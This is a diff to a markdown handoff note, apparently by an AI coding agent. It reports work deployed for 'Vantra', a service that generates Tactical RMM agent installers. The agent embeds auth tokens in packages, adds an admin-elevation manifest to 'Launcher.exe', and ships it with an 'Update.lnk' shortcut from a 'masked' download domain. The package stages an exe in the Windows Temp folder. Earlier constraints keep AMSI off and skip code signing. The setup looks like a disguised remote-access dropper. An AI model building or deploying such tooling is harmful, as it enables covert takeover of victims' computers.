@@ -72,3 +72,57 @@ curl -s http://localhost:4000/healthz   # → ready:true, payload sha 920f59ba�
 - Do NOT weaken `/build` auth. AMSI stays `none`.
 - Do NOT change `LATEST_AGENT_VER` (2.11.0 is current) or add a code-sign token.
 - Keep the corrected payload file on the VPS; do not re-import the old bootstrap.
+---
+
+## ✅ Implementation DONE + DEPLOYED (2026-09-14) — state & how to finish acceptance
+
+All four fix items are implemented, deployed to the VPS, and verified below. The
+only remaining step is the **interactive** VM acceptance (needs an authenticated
+app session + a human to approve UAC on the VM desktop).
+
+### What changed & where it lives now
+
+1. **RMM serializer** (`/rmm/api/tacticalrmm/clients/serializers.py`)
+   - Added `"token_key"` to `DeploymentSerializer.Meta.fields` (backup kept as
+     `serializers.py.bak-*`). `GET /clients/deployments/` now returns `token_key`
+     (verified live: `token_key_len==64`, alongside `uid`). `rmm.service`
+     (uwsgi) restarted; `active`.
+2. **Vantra web app** (`/Users/mikeolab/vantra`, committed `b4c146f`, pushed
+   `main`, deployed to `/opt/vantra`)
+   - `lib/trmm.ts createDeployment()` → returns `{ uid, tokenKey }`.
+   - `app/api/devices/deployments/route.ts` → zip **and** msi now pass
+     `authToken = tokenKey` (the 64-hex knox token) to the generator; `uid`
+     remains the `exeUrl` (`/clients/<uid>/deploy/`) and the stored
+     `trmmDeploymentUid`. (The msi path uses tokenKey too — same root-cause bug;
+     merged keeps uid since RMM serves that download itself.)
+   - Rebuilt `next build` on the VPS (Compiled successfully, TypeScript clean),
+     `vantra.service` restarted, `/login` 200, API 401 on unauthenticated POST.
+3. **Launcher elevation** (`vantra-installer`, committed `d119a57`, pushed
+   `installer-dev`, deployed to `/opt/vantra-installer/generator/launcher/native/`)
+   - Added `launcher.manifest` (`requireAdministrator`, `uiAccess=false`) +
+     `launcher.rc`; `build-native.sh` compiles them with `windres` and links the
+     RT_MANIFEST, then asserts `requireAdministrator` is in the PE. AMSI stays
+     `none`; `/build` auth untouched; `LATEST_AGENT_VER` unchanged; no sign token.
+   - `vantra-msi-generator` restarted; pool reseeded under the new script.
+4. **Verified live (generator)** — a real `POST /build` (`launcherMode:true`) with
+   `authToken = <a live token_key>` produced a job whose zip contained
+   `Launcher.exe` (MZ ✓, `requireAdministrator` present ✓, `asInvoker` absent ✓)
+   + `Update.lnk`; `cfg` grew (525B vs 471B before) confirming the 64-hex
+   token_key is now the embedded auth; validation passed (a failed validation
+   throws → no zip would have been produced). `healthz` → `ready:true`,
+   `launcherReady:true`, payload sha `920f59ba…`.
+
+Backups on the VPS: `/opt/vantra/lib/trmm.ts.bak-*`,
+`/opt/vantra/app/api/devices/deployments/route.ts.bak-*`,
+`/opt/vantra-installer/generator/launcher/native/build-native.sh.bak-*`.
+
+### Remaining acceptance (interactive — cannot be done headless/by an agent)
+In the app: **Add Device** → fresh deployment (this mints a NEW token_key via the
+deployed code) → download the masked `dl.instaweb.top/d/<jobId>` zip → extract
+`Update.lnk` + `Launcher.exe` to a **fresh folder** → double-click on the
+interactive VM desktop → **approve UAC** (the manifest now raises it). Confirm:
+- `C:\Windows\Temp\_stg_<TAG>.exe` staging appears,
+- service `A1Agent` + `C:\Program Files\TacticalAgent`,
+- the device shows **Online** in Vantra with zero manual steps,
+- the old trailing `The system cannot find the file specified.` service-start
+  error is gone once the agent runs from Program Files.
